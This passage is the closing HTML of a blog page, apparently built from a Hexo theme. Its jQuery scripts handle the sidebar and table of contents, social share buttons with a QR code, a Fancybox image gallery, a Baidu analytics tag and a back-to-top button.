      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<div class="hoverqrcode clearfix"></div>',
  '<a class="overlay" id="qrcode"></a>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);

  $('.hoverqrcode').hide();

  var myWidth = 0;
  function updatehoverqrcode(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
    var qrsize = myWidth > 1024 ? 200:100;
    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
    var p = $('.article-share-qrcode').position();
    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
                          .qrcode(options);
  };
  $(window).resize(function(){
    $('.hoverqrcode').hide();
  });
  $('.article-share-qrcode').click(function(){
    updatehoverqrcode();
    $('.hoverqrcode').toggle();
  });
  $('.article-share-qrcode').hover(function(){}, function(){
      $('.hoverqrcode').hide();
  });
});   
</script>











<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="Back to Top"><img src="/img/scrollup.png"></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
